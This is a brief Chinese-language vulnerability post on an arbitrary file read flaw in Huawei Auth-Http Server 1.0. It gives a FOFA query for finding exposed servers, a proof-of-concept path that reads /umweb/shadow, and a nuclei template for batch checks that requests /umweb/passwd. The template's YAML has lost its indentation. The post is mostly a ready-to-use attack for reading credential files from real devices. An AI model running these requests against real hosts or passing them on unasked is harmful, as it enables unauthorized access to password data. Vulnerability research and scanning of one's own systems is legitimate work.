# 原创
：  华为Auth-Http Serve任意文件读取

# 华为Auth-Http Serve任意文件读取

> 
<h3>公众号：掌控安全EDU 分享更多技术文章，欢迎关注一起探讨学习</h3>


### 1.漏洞描述

华为Auth-Http Server 1.0任意文件读取，攻击者可通过该漏洞读取任意文件。

### 2.网络资产查找

**FOFA：server=”Huawei Auth-Http Server 1.0”**

### 2、部分界面如下

### 3、Poc

**/umweb/shadow**

### 4、Poc批量验证

```
id: huanwei-auth-http-server-fileread

info:
name: 华为Auth-Http Server 1.0任意文件读取
author:
severity: medium
description: 华为Auth-Http Server 1.0任意文件读取，攻击者可通过此漏洞获取敏感信息。

reference:
- https://
metadata:
fofa-query: server="Huawei Auth-Http Server 1.0"
verified: true
max-request: 1

http:
- raw:
- |
GET /umweb/passwd HTTP/1.1
Host: {{Hostname}}


matchers:
- type: dsl
dsl:
- 'status_code==200 &amp;&amp; contains_all(body,"root")'
```
